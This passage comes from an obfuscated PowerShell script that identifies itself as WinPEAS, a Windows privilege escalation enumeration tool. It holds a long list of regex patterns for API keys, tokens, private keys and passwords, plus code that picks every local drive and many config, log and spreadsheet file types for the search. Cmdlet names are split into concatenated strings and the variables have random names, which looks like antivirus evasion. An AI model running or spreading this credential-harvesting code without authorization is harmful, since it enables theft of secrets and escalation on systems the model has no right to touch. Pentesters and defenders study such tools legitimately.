  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Okta Access Token", "([a-z0-9=_\-]{42})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("OpenAI API Token", "sk-[&('A' + '-' + 'Z' + 'a')-z0-9]{48}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("ORB Intelligence Access Key", "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Pastebin API Key", "(pastebin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("PayPal Braintree Access Token", 'access_token\$jxTqGTVCVrPUCIFqGgRtXlpCFAGSqzQdfFClvfpTUwVPQDlIwURgtRJwvkvGdsQagAWnklFfBXPcrtVNnYhCppxhvZkLDqLWFskl\$[0-9a-z]{16}\$[0-9a-f]{32}')
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Picatic API Key", "sk_live_[0-9a-z]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Pinata API Key", "(pinata[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{64})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Planetscale API Key", "pscale_tkn_[&('a' + '-' + 'z' + 'A')-Z0-9_\.\-]{43}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("PlanetScale OAuth token", "(pscale_oauth_[&('a' + '-' + 'z' + 'A')-Z0-9_\.\-]{32,64})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Planetscale Password", "pscale_pw_[&('a' + '-' + 'z' + 'A')-Z0-9_\.\-]{43}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Plaid API Token", "(access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Plaid Client ID", "([a-z0-9]{24})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Plaid Secret key", "([a-z0-9]{30})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Prefect API token", "(pnu_[a-z0-9]{36})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Postman API Key", "PMAK-[&('a' + '-' + 'f' + 'A')-F0-9]{24}-[&('a' + '-' + 'f' + 'A')-F0-9]{34}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Private Keys", "\-\-\-\-\-BEGIN PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN RSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN OPENSSH PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN PGP PRIVATE KEY BLOCK\-\-\-\-\-|\-\-\-\-\-BEGIN DSA PRIVATE KEY\-\-\-\-\-|\-\-\-\-\-BEGIN EC PRIVATE KEY\-\-\-\-\-")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Pulumi API Key", "pul-[a-f0-9]{40}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("PyPI upload token", "pypi-AgEIcHlwaS5vcmc[&('A' + '-' + 'Z' + 'a')-z0-9_\-]{50,}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Quip API Key", "(quip[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('a' + '-' + 'z' + 'A')-Z0-9]{15}=\|[0-9]{10}\|[&('a' + '-' + 'z' + 'A')-Z0-9\/+]{43}=)['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("RapidAPI Access Token", "([a-z0-9_-]{50})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Rubygem API Key", "rubygems_[a-f0-9]{48}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Readme API token", "rdme_[a-z0-9]{70}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sendbird Access ID", "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sendbird Access Token", "([a-f0-9]{40})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sendgrid API Key", "SG\.[&('a' + '-' + 'z' + 'A')-Z0-9_\.\-]{66}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sendinblue API Key", "xkeysib-[a-f0-9]{64}-[&('a' + '-' + 'z' + 'A')-Z0-9]{16}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sentry Access Token", "([a-f0-9]{64})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Shippo API Key, Access Token, Custom Access Token, Private App Access Token & Shared Secret", "shippo_(live|test)_[a-f0-9]{40}|shpat_[&('a' + '-' + 'f' + 'A')-F0-9]{32}|shpca_[&('a' + '-' + 'f' + 'A')-F0-9]{32}|shppa_[&('a' + '-' + 'f' + 'A')-F0-9]{32}|shpss_[&('a' + '-' + 'f' + 'A')-F0-9]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sidekiq Secret", "([a-f0-9]{8}:[a-f0-9]{8})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Sidekiq Sensitive URL", "([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Slack Token", "xox[baprs]-([0-9a-&('z' + 'A' + '-' + 'Z')]{10,48})?")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Slack Webhook", "https://hooks.slack.com/services/T[&('a' + '-' + 'z' + 'A')-Z0-9_]{10}/B[&('a' + '-' + 'z' + 'A')-Z0-9_]{10}/[&('a' + '-' + 'z' + 'A')-Z0-9_]{24}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Smarksheel API Key", "(smartsheet[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{26})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Square Access Token", "sqOatp-[0-9A-Za-z_\-]{22}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Square API Key", "EAAAE[&('a' + '-' + 'z' + 'A')-Z0-9_-]{59}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Square Oauth Secret", "sq0csp-[ 0-9A-Za-z_\-]{43}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Stytch API Key", "secret-.*-[&('a' + '-' + 'z' + 'A')-Z0-9_=\-]{36}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Stripe Access Token & API Key", "(sk|pk)_(test|live)_[0-9a-z]{10,32}|k_live_[0-9a-&('z' + 'A' + '-' + 'Z')]{24}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("SumoLogic Access ID", "([a-z0-9]{14})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("SumoLogic Access Token", "([a-z0-9]{64})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Telegram Bot API Token", "[0-9]+:AA[0-9A-&('Z' + 'a' + '-' + 'z')\\-_]{33}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Travis CI Access Token", "([a-z0-9]{22})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Trello API Key", "(trello[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-z]{32})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twilio API Key", "SK[0-9a-&('f' + 'A' + '-' + 'F')]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twitch API Key", "(twitch[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twitter Client ID", "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{18,25}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twitter Bearer Token", "(A{22}[&('a' + '-' + 'z' + 'A')-Z0-9%]{80,100})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twitter Oauth", "[tT][wW][iI][tT][tT][eE][rR].{0,30}['""\\s][0-9a-&('z' + 'A' + '-' + 'Z')]{35,44}['""\\s]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Twitter Secret Key", "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{35,44}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Typeform API Key", "tfp_[a-z0-9_\.=\-]{59}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("URLScan API Key", "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Vault Token", "[sb]\.[&('a' + '-' + 'z' + 'A')-Z0-9]{24}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Yandex Access Token", "(t1\.[A-Z0-9a-z_-]+[=]{0,2}\.[A-Z0-9a-z_-]{86}[=]{0,2})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Yandex API Key", "(AQVN[&('A' + '-' + 'Z' + 'a')-z0-9_\-]{35,38})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Yandex AWS Access Token", "(YC[&('a' + '-' + 'z' + 'A')-Z0-9_\-]{38})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Web3 API Key", "(web3[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([&('A' + '-' + 'Z' + 'a')-z0-9_=\-]+\.[&('A' + '-' + 'Z' + 'a')-z0-9_=\-]+\.?[&('A' + '-' + 'Z' + 'a')-z0-9_.+/=\-]*)['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Zendesk Secret Key", "([a-z0-9]{40})")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Generic API Key", "((key|api|token|secret|password)[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if ($hHaNAtbucBAnoTfarLqwvSjlEAlJvGofFLdhJtrkeCHTcdQDDKxFktJvtubJcFEcHlZBzeCjptqpOwfGVGfulMZLEmzRVXHYSSZc) {
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Authorization Basic", "basic [&('a' + '-' + 'z' + 'A')-Z0-9_:\.=\-]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Authorization Bearer", "bearer [&('a' + '-' + 'z' + 'A')-Z0-9_\.=\-]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Alibaba Access Key ID", "(LTAI)[a-z0-9]{20}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Alibaba Secret Key", "(alibaba[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Asana Client ID", "((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9]{16})['""])|((asana[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""])")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("AWS Client ID", "(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("AWS MWS Key", "amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("AWS Secret Key", "aws(.{0,20})?['""][0-9a-&('z' + 'A' + '-' + 'Z')\/+]{40}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("AWS AppSync GraphQL Key", "da2-[a-z0-9]{26}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Basic Auth Credentials", "://[&('a' + '-' + 'z' + 'A')-Z0-9]+:[&('a' + '-' + 'z' + 'A')-Z0-9]+@[&('a' + '-' + 'z' + 'A')-Z0-9]+\.[&('a' + '-' + 'z' + 'A')-Z]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Beamer Client Secret", "(beamer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](b_[a-z0-9=_\-]{44})['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Cloudinary Basic Auth", "cloudinary://[0-9]{15}:[0-9A-&('Z' + 'a' + '-' + 'z')]+@[&('a' + '-' + 'z')]+")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Facebook Client ID", "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9]{13,17}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Facebook Oauth", "[fF][aA][cC][eE][bB][oO][oO][kK].*['|""][0-9a-f]{32}['|""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Facebook Secret Key", "([fF][aA][cC][eE][bB][oO][oO][kK]|[fF][bB])(.{0,20})?['""][0-9a-f]{32}")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Jenkins Creds", "<[&('a' + '-' + 'z' + 'A')-Z]*>{[&('a' + '-' + 'z' + 'A')-Z0-9=+/]*}<")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Generic Secret", "[sS][eE][cC][rR][eE][tT].*['""][0-9a-&('z' + 'A' + '-' + 'Z')]{32,45}['""]")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Basic Auth", "//(.+):(.+)@")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("PHP Passwords", "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass|pass').*[=:].+|define ?\('(\w*pass|\w*pwd|\w*user|\w*datab)")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Config Secrets (Passwd / Credentials)", "passwd.*|creden.*|^kind:[^&('a' + '-' + 'z' + 'A')-Z0-9_]?Secret|[^&('a' + '-' + 'z' + 'A')-Z0-9_]env:|secret:|secretName:|^kind:[^&('a' + '-' + 'z' + 'A')-Z0-9_]?EncryptionConfiguration|\-\-encryption\-provider\-config")
  $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("Generiac API tokens search", "(access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key| amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret| api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret| application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket| aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password| bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key| bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver| cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret| client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password| cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|conn.login| connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test| datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password| digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd| docker_password|dockerhub_password|dockerhubpassword|&('d' + 'o' + 't' + '-' + 'f' + 'i' + 'l' + 'e' + 's')|dotfiles|droplet_travis_password|dynamoaccesskeyid| dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password| env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .,<\-]{0,25}(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-zA-Z_=\-]{8,64})['""]")
}

if($FullCheck){$Excel = $true}

$BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.add("IPs", "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)")
$MrSwNdlGcGMMieEwFYlAwCjyRhvoYqLuBnZPimcMEufijJXWBlMARIGMxDrfbRjGosbtwfKsUYRgVYQmQrxpLTZkeOzCrOWvHJUE = &('G' + 'e' + 't' + '-' + 'P' + 'S' + 'D' + 'r' + 'i' + 'v' + 'e') | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.Root -like "*:\" }
$yguUDIpaGJvtcNHDjbknXaKnStXBCnDMwjjOMsmSsBSWJndiYABXKOIyLiMyfPwUAklmgzCqbBmrasGdlKEWkIWSHitmgPGaxpHQ = @("*.xml", "*.txt", "*.conf", "*.config", "*.cfg", "*.ini", ".y*ml", "*.log", "*.bak", "*.xls", "*.xlsx", "*.xlsm")


$yyezUnkJyLNBmmVtCCjfSWhCxxJzEqFxYrjoxyrtzbxYvGmXOcpJZzfZGnnOZnHiXtaxFbChzRxCTsUndRYIpSKpiZCbRBKzcwSo = [system.diagnostics.stopwatch]::StartNew()

if ($FullCheck) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "**Full Check Enabled. This will significantly increase false positives in registry / folder check for Usernames / Passwords.**"
}
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -BackgroundColor Red -ForegroundColor White "ADVISORY: WinPEAS - Windows local Privilege Escalation Awesome Script"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -BackgroundColor Red -ForegroundColor White "WinPEAS should be used for authorized penetration testing and/or educational purposes only"
